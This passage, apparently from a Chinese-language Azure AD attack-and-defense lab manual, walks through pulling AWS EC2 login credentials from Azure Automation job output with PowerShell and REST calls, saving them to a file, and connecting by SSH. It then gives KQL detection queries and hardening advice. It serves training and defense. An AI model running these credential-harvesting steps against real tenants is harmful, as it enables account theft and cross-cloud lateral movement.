| **Output** | 脚本的标准输出 | 🔴 可能包含敏感信息 |
| **Error** | 错误消息 | ⚠️ 可能泄露系统信息 |
| **Warning** | 警告消息 | 🟡 可能泄露配置信息 |
| **Verbose** | 详细输出 | ⚠️ 可能包含调试信息 |
| **Debug** | 调试信息 | 🔴 可能包含敏感数据 |

#### 详细操作

**4.1 使用 Azure Portal 定位 Automation Account**

```
┌─────────────────────────────────────────────────────────────────────────┐
│              Azure Portal 定位 Automation Account                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. 在 Azure Portal 主页                                                │
│     - 在搜索框中输入: "ManageMultiCloud"                                │
│     - 或导航到: All Services > Automation                               │
│                                                                         │
│  2. 选择 Automation Account                                             │
│     名称: ManageMultiCloud                                              │
│     资源组: <Resource-Group-Name>                                        │
│     位置: <Location>                                                     │
│                                                                         │
│  3. 浏览 Automation Account 概览                                        │
│     - 查看资源类型、位置、订阅等信息                                     │
│     - 确认有权限访问此资源                                               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

**4.2 查找 Runbook 和 Jobs**

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    查找目标 Runbook 和 Job                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. 进入 Runbooks                                                       │
│     - 在左侧菜单点击 "Runbooks"                                          │
│     - 查找名为 "ManageAWS" 的 Runbook                                    │
│                                                                         │
│  2. 查看 Runbook 详情                                                   │
│     - 点击 "ManageAWS" Runbook                                           │
│     - 查看 Runbook 类型、描述、创建时间等信息                            │
│                                                                         │
│  3. 进入 Jobs                                                           │
│     - 在 Runbook 页面，点击 "Jobs" 链接                                  │
│     - 或者在 Automation Account 主页点击 "Jobs"                         │
│                                                                         │
│  4. 查找目标 Job                                                        │
│     方法 1: 使用搜索框                                                  │
│     - 在搜索框中输入 Job ID: 742e4e1d-ece0-43d8-9544-0ccf0683a465        │
│                                                                         │
│     方法 2: 按时间排序                                                  │
│     - 按 "Created on" 排序                                             │
│     - 找到最近创建的 Job                                                │
│                                                                         │
│     方法 3: 使用 PowerShell (见下方)                                    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

**4.3 使用 PowerShell 定位 Job**

```powershell
# 设置变量
$resourceGroupName = "<your-resource-group>"
$automationAccountName = "ManageMultiCloud"
$runbookName = "ManageAWS"
$jobId = "742e4e1d-ece0-43d8-9544-0ccf0683a465"  # 来自 Objective 10

# 获取特定 Job
$job = Get-AzAutomationJob -ResourceGroupName $resourceGroupName `
                            -AutomationAccountName $automationAccountName `
                            -Id $jobId

if ($job) {
    Write-Host "找到目标 Job:" -ForegroundColor Green
    Write-Host "  Job ID: $($job.JobId)" -ForegroundColor White
    Write-Host "  Runbook: $($job.RunbookName)" -ForegroundColor White
    Write-Host "  状态: $($job.Status)" -ForegroundColor White
    Write-Host "  创建时间: $($job.CreationTime)" -ForegroundColor White
    Write-Host "  结束时间: $($job.EndTime)" -ForegroundColor White
} else {
    Write-Host "未找到指定的 Job" -ForegroundColor Red
}
```

**预期输出：**
```
找到目标 Job:
  Job ID: 742e4e1d-ece0-43d8-9544-0ccf0683a465
  Runbook: ManageAWS
  状态: Completed
  创建时间: 2024-01-15 14:37:45
  结束时间: 2024-01-15 14:38:20
```

#### 为什么需要 Job ID？

| 信息来源 | 方法 | 优缺点 |
|----------|------|--------|
| **使用 Job ID** | 直接查询 | ✅ 精确定位，快速 |
| **按时间排序** | 浏览最新 Job | ⚠️ 可能有多个 Job，需要筛选 |
| **按状态筛选** | 筛选 Completed | ⚠️ 需要进一步确认 |

**设计依据：** 在 Objective 10 中通过 GitHub IssueOps 获取 Job ID，这是攻击链的关键环节，将 DevOps 攻击与云资源访问关联起来。

---

### 步骤 5：提取凭据 (Data Exfiltration)

#### 目标

从 Azure Automation Job 的 Output 中提取 AWS EC2 实例的登录凭据，实现多云环境横向移动。

#### 技术原理

**Job Output 数据结构：**

```
┌─────────────────────────────────────────────────────────────────────────┐
│              Job Output 数据结构                                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Job Output 格式:                                                       │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ {                                                                │   │
│  │   "status": "Completed",                                         │   │
│  │   "output": [                                                    │   │
│  │     "VM Public IP: 3.208.47.144",                               │   │
│  │     "User UserName: ASwtpuya6605",                              │   │
│  │     "User Password: ASriqpvsoecwljngk6613"                      │   │
│  │   ],                                                             │   │
│  │   "creationTime": "2024-01-15T14:37:45Z",                        │   │
│  │   "endTime": "2024-01-15T14:38:20Z"                              │   │
│  │ }                                                                │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  风险: Output 被永久保存，任何有读取权限的人都能查看                     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

**Runbook 输出最佳实践对比：**

| 做法 | 示例 | 风险 |
|------|------|------|
| **危险** | `Write-Output "Password: $password"` | 🔴 密码明文记录 |
| **不推荐** | `Write-Verbose "Creating user: $username"` | ⚠️ 可能泄露用户信息 |
| **推荐** | `Write-Output "User created successfully"` | ✅ 不包含敏感信息 |
| **最佳实践** | 将凭据存储在 Key Vault，脚本仅引用 | ✅ 敏感信息不进入日志 |

#### 详细操作

**5.1 方法 A：使用 Azure Portal GUI**

```
┌─────────────────────────────────────────────────────────────────────────┐
│              使用 Azure Portal 查看 Job Output                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. 打开目标 Job                                                        │
│     - 在 Jobs 列表中，点击目标 Job ID                                   │
│     - 或使用搜索框直接搜索 Job ID                                       │
│                                                                         │
│  2. 查看 Job 概览                                                      │
│     - 查看 Status: Completed                                            │
│     - 查看 Runbook: ManageAWS                                           │
│     - 查看 Creation Time 和 End Time                                    │
│                                                                         │
│  3. 查看 Job Output                                                    │
│     - 在 Job 页面，点击 "Output" 标签页                                  │
│     - 查看脚本输出内容                                                  │
│                                                                         │
│  4. 提取凭据                                                            │
│     在 Output 中查找并记录以下信息：                                     │
│     - VM Public IP: 3.208.47.144                                        │
│     - User UserName: ASwtpuya6605                                       │
│     - User Password: ASriqpvsoecwljngk6613                              │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

**5.2 方法 B：使用 PowerShell REST API**

```powershell
# 使用 Azure PowerShell 获取 Job Output
$resourceGroupName = "<your-resource-group>"
$automationAccountName = "ManageMultiCloud"
$jobId = "742e4e1d-ece0-43d8-9544-0ccf0683a465"

# 获取 Job Output
$output = Get-AzAutomationJobOutput -ResourceGroupName $resourceGroupName `
                                     -AutomationAccountName $automationAccountName `
                                     -Id $jobId `
                                     -Stream Output

Write-Host "Job Output 内容:" -ForegroundColor Cyan
Write-Host $output.Summary -ForegroundColor White

# 解析输出内容 (假设是文本格式)
$outputLines = $output.Summary -split "`n"

$credentials = @{}
foreach ($line in $outputLines) {
    if ($line -match "VM Public IP:\s*(.+)") {
        $credentials['PublicIP'] = $matches[1].Trim()
    }
    if ($line -match "User UserName:\s*(.+)") {
        $credentials['UserName'] = $matches[1].Trim()
    }
    if ($line -match "User Password:\s*(.+)") {
        $credentials['Password'] = $matches[1].Trim()
    }
}

# 显示提取的凭据
if ($credentials.Count -gt 0) {
    Write-Host "`n[!] 提取到 AWS 凭据:" -ForegroundColor Yellow
    $credentials.GetEnumerator() | ForEach-Object {
        Write-Host "  $($_.Key): $($_.Value)" -ForegroundColor White
    }
}
```

**预期输出：**
```
Job Output 内容:
VM Public IP: 3.208.47.144
User UserName: ASwtpuya6605
User Password: ASriqpvsoecwljngk6613

[!] 提取到 AWS 凭据:
  PublicIP: 3.208.47.144
  UserName: ASwtpuya6605
  Password: ASriqpvsoecwljngk6613
```

**5.3 方法 C：使用 REST API (高级)**

```powershell
# 使用 REST API 直接调用
# 获取访问令牌
$azContext = Get-AzContext
$profile = [Microsoft.Azure.Commands.Common.Authentication.Abstractions.AzureRmProfileProvider]::Instance.Profile
$profileClient = New-Object Microsoft.Azure.Commands.ResourceManager.Common.Profile.RMProfileClient($profile)
$token = $profileClient.AcquireAccessToken($azContext.Subscription.TenantId)

# 构造请求
$subscriptionId = $azContext.Subscription.Id
$resourceGroupName = "<your-resource-group>"
$automationAccountName = "ManageMultiCloud"
$jobId = "742e4e1d-ece0-43d8-9544-0ccf0683a465"

$uri = "https://management.azure.com/subscriptions/$subscriptionId/" +
       "resourceGroups/$resourceGroupName/" +
       "providers/Microsoft.Automation/automationAccounts/$automationAccountName/" +
       "jobs/$jobId/outputs?api-version=2023-11-01"

# 发送请求
$response = Invoke-RestMethod -Uri $uri `
                              -Method Get `
                              -Headers @{ 'Authorization' = "Bearer $token" }

# 显示响应
$response | ConvertTo-Json -Depth 10
```

**5.4 保存凭据到文件**

```powershell
# 保存凭据到文件
$credentialsFile = "C:\AzAD\Tools\AWS_Credentials.json"

$credsObject = [PSCustomObject]@{
    Source = "Azure Automation Job Output"
    JobId = $jobId
    ExtractedAt = (Get-Date -Format "o")
    AWS = @{
        PublicIP = $credentials['PublicIP']
        UserName = $credentials['UserName']
        Password = $credentials['Password']
    }
}

$credsObject | ConvertTo-Json -Depth 10 | Out-File -FilePath $credentialsFile -Encoding UTF8

Write-Host "`n凭据已保存到: $credentialsFile" -ForegroundColor Green
```

#### 为什么这种方法有效？

**Automation Job 的访问控制：**

Azure Automation Job 的访问基于 Azure RBAC：

| 角色 | 读取 Job | 读取 Output | 备注 |
|------|---------|-------------|------|
| Owner | ✅ | ✅ | 完全控制 |
| Contributor | ✅ | ✅ | 可以管理资源 |
| Reader | ✅ | ✅ | 可以读取所有信息 |
| Automation Operator | ✅ | ✅ | 可以管理 Automation |

**关键发现：** 读取 Job Output 不需要特殊权限，只要有基本的 Automation Account 读取权限即可。

**设计依据：** 根据 [target10.md](target10.md) 中的分析，DevOps 自动化流程通常会在日志中记录敏感信息，这是一个常见但危险的做法。

---

### 步骤 6：验证横向移动 (Validation)

#### 目标

使用提取的 AWS 凭据连接到 EC2 实例，验证多云横向移动成功。

#### 技术原理

**多云攻击场景：**

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     多云横向移动攻击链                                    │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  第 1 步: Azure 环境攻击                                                 │
│  ├─ Wiki 信息泄露 → 获取密码和证书                                      │
│  ├─ GitHub PAT 泄露 → 触发自动化                                        │
│  ├─ 使用 CBA 绕过 MFA → 登录 Azure                                      │
│  └─ 从 Automation Job 提取 AWS 凭据                                     │
│                                                                         │
│  第 2 步: AWS 环境攻击                                                   │
│  ├─ 使用提取的凭据连接 EC2                                               │
│  ├─ 在 AWS 环境中建立立足点                                              │
│  └─ 继续横向移动或数据窃取                                               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

#### 详细操作

**6.1 准备 AWS 连接**

```powershell
# 设置 AWS 凭据环境变量
$awsPublicIP = "3.208.47.144"
$awsUserName = "ASwtpuya6605"
$awsPassword = "ASriqpvsoecwljngk6613"

Write-Host "AWS 连接信息:" -ForegroundColor Cyan
Write-Host "  IP: $awsPublicIP" -ForegroundColor White
Write-Host "  用户: $awsUserName" -ForegroundColor White
Write-Host "  密码: $awsPassword" -ForegroundColor White
```

**6.2 测试网络连接**

```powershell
# 测试网络连接
Test-NetConnection -ComputerName $awsPublicIP -Port 22 | Select-Object ComputerName, RemotePort, TcpTestSucceeded
```

**预期输出：**
```
ComputerName     RemotePort TcpTestSucceeded
------------     ----------- ----------------
3.208.47.144     22         True
```

**6.3 使用 SSH 连接（如果在 Linux 环境中）**

```bash
# 使用 SSH 连接到 AWS EC2 实例
ssh ASwtpuya6605@3.208.47.144
# 输入密码: ASriqpvsoecwljngk6613
```

**6.4 验证登录成功**

如果连接成功，你应该能够：
- 看到 EC2 实例的命令提示符
- 执行命令查看系统信息
- 访问实例上的资源

---

## 检测与防御

基于项目的 [IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md) 和相关检测规则，以下是针对此攻击链的检测方法。

### 检测方法

#### 1. CBA 登录异常检测

**检测逻辑**: 监控异常的证书认证活动

```kusto
// KQL 查询示例 - Microsoft Sentinel / Microsoft 365 Defender
// 检测基于证书的认证活动
EntraIdSignInEvents
| where AuthenticationMethod == "Certificate" or AuthenticationMethod == "X509Certificate"
| extend CertificateDetail = parse_json(AdditionalDetails)
| project Timestamp,
          AccountUpn,
          IPAddress,
          Country,
          DeviceDetail,
          Result,
          ConditionalAccessPolicies,
          CertificateDetail
| where Result == "Success"
| sort by Timestamp desc
```

**检测要点：**
- 监控所有 CBA 登录活动
- 关注来自异常位置或设备的 CBA 登录
- 检查 CBA 登录是否绕过了预期的 MFA 策略

#### 2. Automation Job Output 敏感信息检测

**检测逻辑**: 监控 Automation Job 输出中的敏感信息模式

```kusto
// Azure Monitor / Log Analytics 查询
// 检测 Job Output 中的敏感信息
AzureActivity
| where OperationNameValue == "Microsoft.Automation/automationAccounts/jobs/write"
| where ActivityStatus == "Succeeded"
| extend JobId = tostring(Properties_JobId)
| extend Output = tostring(Properties_Output)
| where Output contains "password" or
      Output contains "secret" or
      Output contains "key" or
      Output matches regex @"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"  // IP 地址
| project Timestamp,
          JobId,
          Caller,
          Output
| sort by Timestamp desc
```

**检测要点：**
- 监控包含敏感关键字的 Job Output
- 检测包含 IP 地址、密码格式的输出
- 追踪谁在访问这些 Job Output

#### 3. 多阶段攻击关联检测

**文件位置：** [queries/MDA-Hunt-Multi-Stage-Incident.kql](queries/MDA-Hunt-Multi-Stage-Incident.kql)

```kusto
// 关联多阶段攻击活动
let timeRange = 1h;
let targetUser = "ChristinaWBurrus@<domain>.com";

// 阶段 1: GitHub PAT 泄露 (来自 Objective 10)
let gitHubActivity = CloudAppEvents
| where ActionType == "Issue.Create" or ActionType == "Push"
| where AccountUpn == targetUser
| project Timestamp, Stage = "GitHub Activity", ActionType;

// 阶段 2: CBA 登录 (本实验)
let cbaSignIn = EntraIdSignInEvents
| where AccountUpn == targetUser
| where AuthenticationMethod == "Certificate"
| project Timestamp, Stage = "CBA Sign-in", AuthenticationMethod;

// 阶段 3: Automation Job 访问
let automationAccess = AzureActivity
| where OperationNameValue contains "automationAccounts/jobs"
| where Caller == targetUser
| project Timestamp, Stage = "Automation Access", OperationNameValue;

// 关联所有阶段
union gitHubActivity, cbaSignIn, automationAccess
| sort by Timestamp asc
| summarize Stages = make_list(Stage), Count = count() by bin(Timestamp, timeRange)
| where Count >= 2
```

#### 4. 条件访问策略变更监控

**文件位置：** [config/ruletemplates/Policy-change-detected.json](config/ruletemplates/Policy-change-detected.json)

```kusto
// 监控条件访问策略变更
AuditLogs
| where Category == "Policy"
| where OperationName == "Update conditional access policy" or
      OperationName == "Create conditional access policy"
| extend Actor = tostring(InitiatedBy.user.userPrincipalName),
         TargetPolicy = tostring(TargetResources[0].displayName)
| project Timestamp, OperationName, Actor, TargetPolicy, ModifiedProperties
| where ModifiedProperties has "authenticationStrength" or
      ModifiedProperties has "allowedCombinations"
```

### 防御措施

#### 1. 证书管理最佳实践

**问题**: PFX 证书保护密码与登录密码相同

**解决方案：**

| 方法 | 说明 | 优先级 |
|------|------|--------|
| **独立密码** | 证书使用独立的强密码 | 高 |
| **硬件存储** | 使用智能卡或 TPM 存储私钥 | 高 |
| **证书轮换** | 定期轮换证书 | 中 |
| **证书撤销** | 建立证书撤销流程 | 中 |

**实施示例：**

```powershell
# 创建强随机的 PFX 保护密码
$pfxPassword = ConvertTo-SecureString `
    -String (New-Guid).Guid + "!" + [Guid]::NewGuid().ToString().Substring(0, 8) `
    -AsPlainText `
    -Force

# 导出证书时使用独立密码
Export-PfxCertificate -Cert $cert `
                      -FilePath "cert.pfx" `
                      -Password $pfxPassword
```

#### 2. Automation 安全加固

**问题**: Job Output 包含明文敏感信息

**解决方案：**

```powershell
# 错误做法 - 在输出中包含敏感信息
Write-Output "User Password: $password"

# 正确做法 - 使用安全存储
# 1. 将凭据存储在 Automation Account Credential 中
$credential = Get-AutomationPSCredential -Name "AWSAdminCredential"

# 2. 或使用 Azure Key Vault
$secret = Get-AzKeyVaultSecret -VaultName "MyKeyVault" -Name "AWSPassword"

# 3. 仅输出成功消息，不包含敏感信息
Write-Output "AWS user created successfully"
```

**官方文档参考：** [Manage job output and messages in Azure Automation](https://learn.microsoft.com/en-us/azure/automation/automation-runbook-output-and-messages)

#### 3. 条件访问策略优化

**问题**: 策略允许 CBA 作为满足 Phishing-Resistant MFA 的方法

**建议调整：**

```json
// 当前配置 (允许 CBA)
{
  "grantControls": {
    "authenticationStrength": {
      "policy": "PhishingResistantMFA",
      "allowedCombinations": [
        "password, x509CertificateMultiFactor"  // CBA 被允许
      ]
    }
  }
}

// 推荐配置 (限制 CBA)
{
  "grantControls": {
    "authenticationStrength": {
      "policy": "PhishingResistantMFA",
      "allowedCombinations": [
        "fido2"  // 仅允许 FIDO2，要求物理设备
      ]
    }
  }
}
```

**权衡考虑：**
- FIDO2 更安全，但需要硬件采购
- CBA 便于部署，但需要严格的证书管理
- 混合使用：对高特权账户要求 FIDO2，普通用户允许 CBA

#### 4. 最小权限原则

**文件位置：** [AadSecConfig.json](config/AadSecConfig.json)

```json
{
  "ControlName": "Default User Role Permissions",
  "Controls": [
    {
      "Name": "allowedToReadOtherUsers",
      "Recommendation": "限制普通用户读取其他用户信息的权限"
    }
  ]
}
```

**实施建议：**
1. 定期审查 Automation Account 的访问权限
2. 使用专用账户运行自动化，而非个人账户
3. 为 Job Output 访问设置单独的权限策略

#### 5. 监控与告警

**基于项目的监控框架：**

根据 [IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md)，应建立以下监控：

| 监控目标 | 检测内容 | 响应时间 |
|----------|----------|----------|
| CBA 登录 | 异常位置/设备的证书登录 | 实时 |
| Automation Job | 包含敏感信息的 Output | 15分钟 |
| 条件访问策略 | 策略配置变更 | 实时 |
| 多阶段攻击 | 关联可疑活动序列 | 1小时 |

---

## 参考资料

### 项目内文档

| 文档 | 位置 | 相关内容 |
|------|------|----------|
| **Objective 10** | [target10.md](target10.md) | GitHub PAT 泄露与 CI/CD 自动化滥用 |
| **Objective 4** | [target4.md](target4.md) | 条件访问策略分析与绕过 |
| **身份安全监控** | [IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md) | 身份安全监控框架 |
| **服务主体安全** | [ServicePrincipals-ADO.md](ServicePrincipals-ADO.md) | Azure DevOps 中的凭据管理 |
| **横向移动防护** | [LateralMovementADEID.md](LateralMovementADEID.md) | AD 攻陷后的防护 |

### KQL 检测查询

| 查询文件 | 位置 | 用途 |
|----------|------|------|
| **多阶段攻击检测** | [queries/MDA-Hunt-Multi-Stage-Incident.kql](queries/MDA-Hunt-Multi-Stage-Incident.kql) | 关联多阶段攻击活动 |
| **AAD 连接账户监控** | [queries/AADConnectorAccount-*.kql](queries/) | 服务主体异常活动检测 |

### 配置文件

| 文件 | 位置 | 用途 |
|------|------|------|
| **安全配置基线** | [config/AadSecConfig.json](config/AadSecConfig.json) | Entra ID 安全配置参考 |
| **策略变更检测** | [config/ruletemplates/Policy-change-detected.json](config/ruletemplates/Policy-change-detected.json) | 策略变更检测规则模板 |

### 官方文档

| 主题 | 链接 |
|------|------|
| **基于证书的认证** | [Microsoft Entra certificate-based authentication overview](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-certificate-based-authentication) |
| **认证强度** | [Conditional Access authentication strength](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-authentication-strengths) |
| **Automation Job Output** | [Manage job output and messages in Azure Automation](https://learn.microsoft.com/en-us/azure/automation/automation-runbook-output-and-messages) |
| **条件访问策略** | [Conditional Access: Grant controls](https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-grant) |

### MITRE ATT&CK 映射

项目的 [media/mitre/AttackScenarios/](media/mitre/AttackScenarios/) 目录包含详细的攻击场景映射：

- [Attacks_Combined.json](media/mitre/AttackScenarios/Attacks_Combined.json) - 所有攻击场景综合映射
- [Attacks_Combined.svg](media/mitre/AttackScenarios/Attacks_Combined.svg) - 可视化攻击图谱

### 外部参考资料

| 主题 | 来源 |
|------|------|
| **OWASP 秘钥管理** | [OWASP Key Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html) |
| **密码复用风险** | [Credential Stuffing Attacks](https://www.cisa.gov/news-events/news/understanding-and-avoiding-credential-stuffing-attacks) |
| **多云安全** | [CISA Multi-Cloud Security](https://www.cisa.gov/news-events/news/cisa-releases-guidance-multi-cloud-environments) |
| **证书最佳实践** | [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/) |

### 实验相关文件位置

| 文件类型 | 位置 | 说明 |
|----------|------|------|
| **攻击结果** | `C:\AzAD\Tools\AWS_Credentials.json` | 本实验生成的 AWS 凭据文件 |
| **前序结果** | `C:\AzAD\Tools\Objective10_Result.json` | Objective 10 的 Job ID 结果 |
| **证书文件** | `C:\AzAD\Tools\ChristinaWBurrus_cert.pfx` | 导入的用户证书 |
| **检测查询** | `queries/` | KQL 检测查询 |
| **规则模板** | `config/ruletemplates/` | Sentinel 规则模板 |

---

## 总结

### 攻击链回顾

本实验展示了一个完整的多云攻击链：

```
信息泄露 (Wiki) → 凭据复用 → MFA 绕过 (CBA) → 凭据提取 (Job Output) → 横向移动 (AWS)
```

### 关键安全教训

1. **证书是强大的凭据**: CBA 满足 Phishing-Resistant MFA 要求，但需要严格管理
2. **密码复用是致命的**: 证书保护密码与登录密码相同导致单点故障
3. **Automation 日志是敏感的**: Job Output 可能包含凭据，需要严格的输出控制
4. **多云攻击是现实的**: 一旦获得初始访问，攻击者可以在云环境间横向移动
5. **DevOps 供应链需要保护**: 自动化流程的漏洞可能导致严重后果

### 防御优先级

| 优先级 | 措施 | 影响 | 实施难度 |
|--------|------|------|----------|
| **关键** | 消除 Automation Job Output 中的敏感信息 | 阻止凭据泄露 | 低 |
| **高** | 实施证书独立密码策略 | 减少密码复用风险 | 低 |
| **高** | 审查条件访问策略的 CBA 允许 | 限制攻击面 | 中 |
| **中** | 使用 Key Vault 存储敏感信息 | 改善凭据管理 | 中 |
| **中** | 启用多阶段攻击检测 | 提高检测能力 | 中 |
| **低** | 考虑部署 FIDO2 | 提升认证安全性 | 高 |

### 下一步学习

完成本实验后，继续学习：
- **多云安全**: 深入了解跨云环境的安全策略
- **DevOps 安全**: 学习安全自动化和 CI/CD 最佳实践
- **证书管理**: 掌握企业级证书生命周期管理
- **零信任架构**: 了解如何实施零信任安全模型

---

**文档版本：** v2.0 (基于项目资料优化版)
**最后更新：** 2025-01-13
**基于：** AzureAD-Attack-Defense-frame 项目 (https://github.com/Cloud-Architekt/AzureAD-Attack-Defense)
**实验手册参考：** Lab Manual PDF (第 82 页至第 88 页)
